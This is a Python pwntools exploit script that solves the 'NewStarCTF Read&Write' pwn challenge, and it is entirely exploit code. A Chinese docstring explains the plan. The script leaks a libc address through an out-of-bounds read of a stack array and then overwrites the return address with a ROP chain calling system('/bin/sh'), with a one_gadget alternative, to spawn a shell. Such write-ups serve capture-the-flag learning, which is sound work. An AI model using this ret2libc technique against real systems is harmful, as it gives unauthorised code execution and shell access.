"""NewStarCTF Read&Write
泄露栈上地址 - 0x243 - libc_start_main 得到  libc地址
list[262]的位置为
0x7ffc14d37c48 —▸ 0x7f99b952c083 (__libc_start_main+243) ◂— mov edi, eax

之后改写这里, 构成ROP
"""
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

# p = remote('node4.buuoj.cn', 26952)
p = process('./pwn')
libc = ELF('./libc-2.31.so')


def Read(idx):
    p.sendlineafter('> ', str(1))
    p.sendlineafter('Idx:', str(idx))
    p.recvuntil('num: ')
    return p.recvuntil('\n', True)


def Write(idx, context):
    p.sendlineafter('> ', str(2))
    p.sendlineafter('Idx:', str(idx))
    p.sendlineafter('Num:', str(context))


def Exit():
    p.sendlineafter('> ', str(0))


libc_low = Read(262)
libc_hight = Read(263)
libc.address = (int(libc_hight) << 32) + int(libc_low) - 243 - libc.sym['__libc_start_main']
success('libc: ' + hex(libc.address))

pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(libc).find_gadget(['ret'])[0]
system = libc.sym['system']
binsh = libc.search(b'/bin/sh').__next__()

def ogg():
    ogg = [0xe3afe, 0xe3b01, 0xe3b04]
    pay = libc.address + ogg[1]
    Write(262, pay & 0xffffFFFF)
    Write(263, pay >> 32)

# M1.rop
# payload = pop_rdi + binsh + ret + system
Write(262, pop_rdi & 0xffffFFFF)
Write(263, pop_rdi >> 32)
Write(264, binsh & 0xffffFFFF)
Write(265, binsh >> 32)
Write(266, ret & 0xffffFFFF)
Write(267, ret >> 32)
Write(268, system & 0xffffFFFF)
Write(269, system >> 32)

# M2.one_gadget
# ogg()

Exit()
p.interactive()
